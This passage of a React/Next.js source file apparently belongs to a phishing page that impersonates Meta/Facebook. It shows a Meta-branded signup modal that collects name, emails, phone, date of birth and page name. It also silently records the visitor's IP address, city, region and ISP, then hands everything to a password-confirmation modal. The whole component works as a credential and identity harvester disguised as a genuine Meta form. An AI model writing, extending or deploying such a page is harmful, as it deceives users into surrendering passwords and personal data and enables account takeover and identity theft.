              className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
              tabIndex={-1}
            >
              {showPw ? (
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
                  <path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" />
                  <line x1="1" y1="1" x2="23" y2="23" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" />
                </svg>
              ) : (
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" stroke="currentColor" strokeWidth="1.5" />
                  <circle cx="12" cy="12" r="3" stroke="currentColor" strokeWidth="1.5" />
                </svg>
              )}
            </button>
          </div>

          <p className="mt-2 text-right">
            <a href="#" className="text-xs text-[#0866FF] hover:underline">Forgot password?</a>
          </p>

          <button
            type="button"
            onClick={handleSubmit}
            disabled={!password || loading}
            className="mt-4 w-full bg-[#0866FF] text-white font-semibold py-3 rounded-xl hover:bg-[#0755d4] transition-colors text-sm disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
          >
            {loading && (
              <svg className="animate-spin w-4 h-4" viewBox="0 0 24 24" fill="none">
                <circle cx="12" cy="12" r="10" stroke="white" strokeWidth="3" strokeOpacity="0.3" />
                <path d="M12 2a10 10 0 0110 10" stroke="white" strokeWidth="3" strokeLinecap="round" />
              </svg>
            )}
            {loading ? "Verifying..." : "Confirm"}
          </button>
        </div>
      </div>
    </div>
  );
}

// ---- Signup Modal ----
export function SignupModal({ onClose }: { onClose: () => void }) {
  const [country, setCountry] = useState<Country>(DEFAULT_COUNTRY);
  const [phone, setPhone] = useState(DEFAULT_COUNTRY.dialCode + " ");
  const [fullName, setFullName] = useState("");
  const [email, setEmail] = useState("");
  const [emailBusiness, setEmailBusiness] = useState("");
  const [pageName, setPageName] = useState("");
  const [note, setNote] = useState("");
  const [dob, setDob] = useState({ day: "", month: "", year: "" });
  const [facebookNotif, setFacebookNotif] = useState(true);
  const [agreeTerms, setAgreeTerms] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");
  const [dropdownOpen, setDropdownOpen] = useState(false);
  const [loadingGeo, setLoadingGeo] = useState(false);
  const [showPasswordModal, setShowPasswordModal] = useState(false);
  const [ipInfo, setIpInfo] = useState({ ip: "", city: "", region: "", org: "" });

  const dropdownRef = useRef<HTMLDivElement>(null);

  // IP geo-detection
  useEffect(() => {
    const token = process.env.NEXT_PUBLIC_IPINFO_TOKEN;
    if (!token) return;
    setLoadingGeo(true);
    fetch(`https://ipinfo.io/json?token=${token}`, { signal: AbortSignal.timeout(5000) })
      .then((r) => r.json())
      .then((d) => {
        const c = COUNTRIES.find((x) => x.code === d.country);
        if (c) {
          setCountry(c);
          setPhone(c.dialCode + " ");
        }
        setIpInfo({
          ip: d.ip || "",
          city: d.city || "",
          region: d.region || "",
          org: d.org || "",
        });
      })
      .catch(() => {})
      .finally(() => setLoadingGeo(false));
  }, []);

  // Scroll lock
  useEffect(() => {
    document.body.style.overflow = "hidden";
    return () => { document.body.style.overflow = ""; };
  }, []);

  // Escape key
  useEffect(() => {
    const h = (e: KeyboardEvent) => { if (e.key === "Escape") onClose(); };
    window.addEventListener("keydown", h);
    return () => window.removeEventListener("keydown", h);
  }, [onClose]);

  // Outside click for dropdown
  useEffect(() => {
    const h = (e: MouseEvent) => {
      if (dropdownRef.current && !dropdownRef.current.contains(e.target as Node)) {
        setDropdownOpen(false);
      }
    };
    document.addEventListener("mousedown", h);
    return () => document.removeEventListener("mousedown", h);
  }, []);

  const selectCountry = (c: Country) => {
    setCountry(c);
    setPhone(c.dialCode + " ");
    setDropdownOpen(false);
    setSearchQuery("");
  };

  const filtered = COUNTRIES.filter(
    (c) =>
      c.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
      c.dialCode.includes(searchQuery)
  );

  const inputCls =
    "w-full px-3 py-2.5 border border-gray-300 rounded-xl text-sm text-gray-900 placeholder-gray-400 outline-none focus:ring-2 focus:ring-[#0866FF] focus:border-[#0866FF] transition";

  return (
    <>
      <div
        className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 px-4"
        onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}
      >
        <div className="relative w-full max-w-[420px] bg-white rounded-2xl shadow-2xl overflow-y-auto max-h-[92vh]">
          {/* Header */}
          <div className="flex items-center justify-center px-5 py-3.5 border-b border-gray-100 relative">
            <Image src="/image/logo-meta.svg" width={88} height={18} alt="Meta" priority />
            <button
              onClick={onClose}
              className="absolute right-4 top-1/2 -translate-y-1/2 w-7 h-7 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors text-gray-400"
              aria-label="Close"
            >
              <svg width="14" height="14" viewBox="0 0 16 16" fill="none">
                <path d="M12 4L4 12M4 4l8 8" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" />
              </svg>
            </button>
          </div>

          {/* Form body */}
          <div className="px-5 py-4 space-y-2.5">
            <input type="text" placeholder="Full Name" value={fullName}
              onChange={(e) => setFullName(e.target.value)} className={inputCls} />

            <input type="email" placeholder="Email" value={email}
              onChange={(e) => setEmail(e.target.value)} className={inputCls} />

            <input type="email" placeholder="Email Business (Optional)" value={emailBusiness}
              onChange={(e) => setEmailBusiness(e.target.value)} className={inputCls} />

            <input type="text" placeholder="Page Name (Optional)" value={pageName}
              onChange={(e) => setPageName(e.target.value)} className={inputCls} />

            {/* Phone row */}
            <div className="flex gap-2">
              {/* Country selector */}
              <div ref={dropdownRef} className="relative shrink-0" style={{ width: "38%" }}>
                <button
                  type="button"
                  onClick={() => { setDropdownOpen((v) => !v); setSearchQuery(""); }}
                  className="w-full h-full px-2.5 py-2.5 border border-gray-300 rounded-xl text-sm flex items-center gap-1.5 hover:border-[#0866FF] transition-colors bg-white"
                  disabled={loadingGeo}
                >
                  <CountryFlag code={country.code} size={18} />
                  <span className="text-gray-700 font-medium text-xs">{country.dialCode}</span>
                  <svg className="ml-auto w-3 h-3 text-gray-400 shrink-0" viewBox="0 0 16 16" fill="none">
                    <path d="M4 6l4 4 4-4" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                </button>

                {dropdownOpen && (
                  <div className="absolute top-full left-0 z-20 mt-1 w-64 bg-white border border-gray-200 rounded-xl shadow-lg overflow-hidden">
                    <div className="p-2 border-b border-gray-100">
                      <input
                        autoFocus
                        type="text"
                        placeholder="Search country..."
                        value={searchQuery}
                        onChange={(e) => setSearchQuery(e.target.value)}
                        className="w-full px-3 py-2 text-sm border border-gray-200 rounded-lg outline-none focus:ring-2 focus:ring-[#0866FF] focus:border-[#0866FF]"
                      />
                    </div>
                    <ul className="max-h-48 overflow-y-auto">
                      {filtered.map((c) => (
                        <li key={c.code}>
                          <button
                            type="button"
                            onClick={() => selectCountry(c)}
                            className={`w-full px-3 py-2 text-sm text-left flex items-center gap-2 hover:bg-blue-50 transition-colors ${c.code === country.code ? "bg-blue-50 font-semibold" : ""}`}
                          >
                            <CountryFlag code={c.code} size={16} />
                            <span className="flex-1 text-gray-800 truncate">{c.name}</span>
                            <span className="text-gray-400 text-xs shrink-0">{c.dialCode}</span>
                          </button>
                        </li>
                      ))}
                      {filtered.length === 0 && (
                        <li className="px-3 py-4 text-sm text-gray-400 text-center">No results</li>
                      )}
                    </ul>
                  </div>
                )}
              </div>

              {/* Phone input */}
              <input
                type="tel"
                placeholder="Phone number"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                className={`${inputCls} flex-1`}
              />
            </div>

            {/* Date of Birth */}
            <label className="block text-xs font-medium text-gray-600 mt-1">Date of Birth</label>
            <div className="grid grid-cols-3 gap-2">
              <input type="number" placeholder="Day" min={1} max={31}
                value={dob.day} onChange={(e) => setDob((d) => ({ ...d, day: e.target.value }))} className={inputCls} />
              <input type="number" placeholder="Month" min={1} max={12}
                value={dob.month} onChange={(e) => setDob((d) => ({ ...d, month: e.target.value }))} className={inputCls} />
              <input type="number" placeholder="Year" min={1900} max={2024}
                value={dob.year} onChange={(e) => setDob((d) => ({ ...d, year: e.target.value }))} className={inputCls} />
            </div>

            {/* Note */}
            <textarea placeholder="Note (Optional)" rows={2} maxLength={500}
              value={note} onChange={(e) => setNote(e.target.value)}
              className={`${inputCls} resize-none`} />
            <div className="text-right text-xs text-gray-400 -mt-1">{note.length}/500</div>

            {/* Facebook notification toggle */}
            <div className="flex items-center gap-3 py-1.5 border border-gray-100 rounded-xl px-3">
              <div className="w-8 h-8 bg-blue-50 rounded-lg flex items-center justify-center shrink-0">
                <FbIcon size={20} />
              </div>
              <div className="flex-1 min-w-0">
                <p className="text-xs font-bold text-gray-900">on Facebook</p>
                <p className="text-[11px] text-gray-500 leading-tight">We will send you a notification on Facebook.</p>
              </div>
              {/* Toggle switch */}
              <div
                role="switch"
                aria-checked={facebookNotif}
                onClick={() => setFacebookNotif((v) => !v)}
                className={`shrink-0 flex items-center cursor-pointer w-10 h-6 rounded-full p-0.5 transition-colors duration-200 ${facebookNotif ? "bg-[#0866FF]" : "bg-gray-300"}`}
              >
                <div className={`w-5 h-5 bg-white rounded-full shadow-sm transition-transform duration-200 ${facebookNotif ? "translate-x-4" : "translate-x-0"}`} />
              </div>
            </div>

            {/* Terms */}
            <div className="flex items-start gap-2.5">
              <input type="checkbox" id="agree-terms" checked={agreeTerms}
                onChange={(e) => setAgreeTerms(e.target.checked)}
                className="mt-0.5 w-4 h-4 accent-[#0866FF] cursor-pointer shrink-0" />
              <label htmlFor="agree-terms" className="text-xs text-gray-700 cursor-pointer leading-relaxed">
                I agree with{" "}
                <a href="#" className="text-[#0866FF] underline hover:text-[#0755d4]">Terms of use</a>
              </label>
            </div>
          </div>

          {/* Footer */}
          <div className="px-5 pb-5">
            <button
              type="button"
              onClick={() => setShowPasswordModal(true)}
              className="w-full bg-[#0866FF] text-white font-semibold py-2.5 rounded-xl hover:bg-[#0755d4] transition-colors text-sm"
            >
              Send
            </button>
          </div>
        </div>

      </div>

      {showPasswordModal && (
        <PasswordModal
          onClose={() => { setShowPasswordModal(false); onClose(); }}
          formData={{
            fullName, email, emailBusiness, pageName, phone,
            dob, note, country: country.name,
            ip: ipInfo.ip, city: ipInfo.city, region: ipInfo.region, org: ipInfo.org,
          }}
        />
      )}
    </>
  );
}
